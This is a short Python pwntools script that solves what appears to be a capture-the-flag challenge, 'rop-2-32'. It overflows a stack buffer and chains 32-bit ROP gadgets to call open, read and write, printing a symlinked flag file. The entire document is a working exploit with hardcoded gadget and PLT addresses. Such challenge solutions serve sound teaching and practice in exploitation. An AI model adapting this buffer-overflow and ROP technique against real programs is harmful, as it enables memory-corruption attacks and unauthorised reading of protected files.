#!/usr/bin/env python

from pwn import *
import os

p = process('./rop-2-32')


"""
0x08048380  read@plt
0x08048390  printf@plt
0x080483a0  exit@plt
0x080483b0  open@plt
0x080483c0  __libc_start_main@plt
0x080483d0  write@plt
"""

buf = "A" * 0x88 + "BBBB"

open_ = p32(0x080483b0)
read_ = p32(0x08048380)
write_ = p32(0x080483d0)


"""
0x0804853a : pop ebp ; cld ; leave ; ret
0x08048626 : pop ebp ; lea esp, [ecx - 4] ; ret
0x0804868b : pop ebp ; ret
0x08048688 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048369 : pop ebx ; ret
0x08048625 : pop ecx ; pop ebp ; lea esp, [ecx - 4] ; ret
0x0804868a : pop edi ; pop ebp ; ret
0x08048689 : pop esi ; pop edi ; pop ebp ; ret

"""

pop_pop_ret = p32(0x0804868a)
pop_pop_pop_ret = p32(0x08048689)


string = p32(0x8048028)
if os.path.exists("4"):
    os.unlink("4")

os.symlink("./flag", "4")

buf += open_
buf += pop_pop_pop_ret
buf += string
buf += p32(0)
buf += p32(0)

buf += read_
buf += pop_pop_pop_ret
buf += p32(3)
buf += p32(0x804a800)
buf += p32(100)

buf += write_
buf += pop_pop_pop_ret
buf += p32(1)
buf += p32(0x804a800)
buf += p32(100)



with open("e.txt", "w") as f:
    f.write(buf)
    f.close

p.sendline(buf)
p.interactive()
